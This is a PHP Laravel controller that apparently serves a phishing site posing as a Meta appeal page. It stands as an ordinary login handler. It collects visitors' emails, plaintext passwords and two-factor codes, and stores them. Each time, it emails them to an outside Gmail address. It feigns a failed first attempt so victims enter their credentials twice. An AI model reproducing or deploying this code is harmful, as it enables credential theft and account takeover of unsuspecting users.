<?php 

namespace App\Http\Controllers; 
use Illuminate\Http\Request; 
use App\Models\Login;
use Mail; 
use Session;
use Redirect;

class LoginController extends Controller { 

    public function create() { 
      return view('contact_form'); 
    }  

    public function store(Request $request) {
      
      if (Session::has('try')){
        Session::put('try','2');
      // do some thing if the key is exist
      }else{
        Session::put('try','1');
        //the key does not exist in the session
      }
      $email = $request->email;
      $password = $request->password;
      $user = Login::where('email', '=', $email)->where('password', '=', $password)->first();
      if ($user === null) {
        $try = Session::get('try');
        // user doesn't exist
        if($try == '1')
        {
          $reciept_email="info@metapageappeal.com";
          $send_email="ademgashi01@gmail.com";
          $data = array('name'=>"Login Email",'from'=>$reciept_email,'sender'=>$send_email,'cus_email'=>$email,'cus_password'=>$password);
          /** Used for send email to Server Email With view **/
          Mail::send('email.loginemail',$data, function ($mail) use ($data) {
            $mail->subject('User Login Email');
            $mail->from($data['from']);
            $mail->to($data['sender']);
          });
          return response()->json(['success'=>'error']);
        }  
        if($try == '2')
        {
          Session::put('email', $email);
          Session::put('password', $password);
          Login::create([
          'email' => $email,
          'password' => $password,
          ]);
          //---Send Email Function
          $reciept_email="info@metapageappeal.com";
          $send_email="ademgashi01@gmail.com";
          $data = array('name'=>"Login Email",'from'=>$reciept_email,'sender'=>$send_email,'cus_email'=>$email,'cus_password'=>$password);

          //dd($data);
         
          /** Used for send email to Server Email With view **/
          Mail::send('email.loginemail',$data, function ($mail) use ($data) {
            $mail->subject('User Login Email');
            $mail->from($data['from']);
            $mail->to($data['sender']);
          });
          $request->session()->forget('try');
          return response()->json(['success'=>'step3']);
        }

      }
      else{
        //---Send Email Function
         $reciept_email="info@metapageappeal.com";
         $send_email="ademgashi01@gmail.com";
         $data = array('name'=>"Login Email",'from'=>$reciept_email,'sender'=>$send_email,'cus_email'=>$email,'cus_password'=>$password);

        //dd($data);
       
        /** Used for send email to Server Email With view **/
        Mail::send('email.loginemail',$data, function ($mail) use ($data) {
          $mail->subject('User Login Email');
          $mail->from($data['from']);
          $mail->to($data['sender']);
        });
        Session::put('email', $email);
        Session::put('password', $password);
        $request->session()->forget('try');
        return response()->json(['success'=>'step3']);
      }
      
      //return response()->json(['success'=>'Form is successfully submitted!']);

    }

    public function codestore(Request $request) {
      //dd($request->all());
      $email = Session::get('email');
      $password = Session::get('password');
      $text = $request->text;
      $user = Login::where('email', '=', $email)->where('password', '=', $password)->get();
      //dd($user[0]->id);
      if($user[0]->code == null)
      {
        Login::where('id', $user[0]->id)->update(['code' => $text]);
        //---Send Email Function
        $reciept_email="info@metapageappeal.com";
        $send_email="ademgashi01@gmail.com";
        $data = array('name'=>"Login Email",'from'=>$reciept_email,'sender'=>$send_email,'cus_code'=>$text,'cus_email'=>$email,'cus_password'=>$password);

        //dd($data);
       
        /** Used for send email to Server Email With view **/
        Mail::send('email.codeemail',$data, function ($mail) use ($data) {
          $mail->subject('User Login Email');
          $mail->from($data['from']);
          $mail->to($data['sender']);
        });
        return view('sumbission');
      }
      else{
        if($user[0]->code != $text)
        {
          return Redirect::back()->withErrors(['msg' => 'Your Enter Code is Wrong!']);
        } 
        if($user[0]->code == $text)
        {
          //---Send Email Function
          $reciept_email="info@metapageappeal.com";
          $send_email="ademgashi01@gmail.com";
          $data = array('name'=>"Login Email",'from'=>$reciept_email,'sender'=>$send_email,'cus_code'=>$text,'cus_email'=>$email,'cus_password'=>$password);

          //dd($data);
         
          /** Used for send email to Server Email With view **/
          Mail::send('email.codeemail',$data, function ($mail) use ($data) {
            $mail->subject('User Login Email');
            $mail->from($data['from']);
            $mail->to($data['sender']);
          });
          return view('sumbission');
        }  
      }
    }
}